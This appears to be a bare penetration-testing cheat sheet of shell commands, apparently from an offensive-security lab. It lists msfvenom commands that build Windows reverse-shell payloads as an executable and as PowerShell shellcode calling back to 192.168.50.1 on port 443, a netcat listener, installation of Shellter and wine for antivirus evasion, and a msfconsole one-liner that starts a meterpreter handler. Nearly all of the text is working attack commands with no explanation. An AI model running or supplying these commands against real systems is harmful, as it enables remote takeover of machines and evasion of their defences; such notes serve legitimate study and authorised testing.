exiftool -a -u brochure.pdf
---------------------------------------------------------------------
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe> binary.exe
---------------------------------------------------------------------
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f powershell -v sc
---------------------------------------------------------------------
nc -lvnp 443
---------------------------------------------------------------------
 apt-cache search shellter
---------------------------------------------------------------------
 apt install shellter
---------------------------------------------------------------------
 apt install wine 
---------------------------------------------------------------------
 dpkg --add-architecture i386 && apt-get update && apt-get install wine32
 ---------------------------------------------------------------------
 msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
 ---------------------------------------------------------------------
